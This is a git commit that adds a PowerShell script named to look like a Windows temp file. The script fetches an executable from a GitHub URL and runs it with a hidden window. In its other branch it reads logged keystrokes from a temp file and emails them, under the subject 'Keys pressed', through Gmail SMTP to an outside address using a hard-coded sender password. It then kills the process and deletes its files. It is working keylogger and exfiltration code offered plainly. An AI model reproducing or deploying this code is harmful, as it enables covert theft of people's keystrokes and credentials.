d117a6839f558c8b34b78cf854c97187869add8b
Zachary Hales <51687053+SmartMozart@users.noreply.github.com>
2023-05-13 12:54:03 -0600

    Create wsuA58F.ps1

---
+++ wsuA58F.ps1
@@ -0,0 +1,17 @@
+if (Test-Path "$env:temp\wsuA58F.tmp") {
+	New-Item "$env:temp\wsuA58F.tmp"
+	(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/psh/main/wsuA58F.exe", "$env:temp\wsuA58F.exe")
+	Start-Process "$env:temp\wsuA58F.exe" -WindowStyle hidden
+} else {
+	$From = "pshs1235@gmail.com"
+	$To = "zacsengines@yahoo.com"
+	$keys = [IO.File]::ReadAllText("$env:temp\wsuA58F.tmp")
+	$SMTPServer = "smtp.gmail.com"
+	$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+	$SMTPClient.EnableSsl = $true
+	$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($From, "ixofwhfteeaiklik")
+	$SMTPClient.Send($From, $To, "Keys pressed", $keys)
+	taskkill -f -im wsuA58F.exe
+	Remove-Item "$env:temp\wsuA58F.tmp"
+	Remove-Item "$env:temp\wsuA58F.exe"
+}
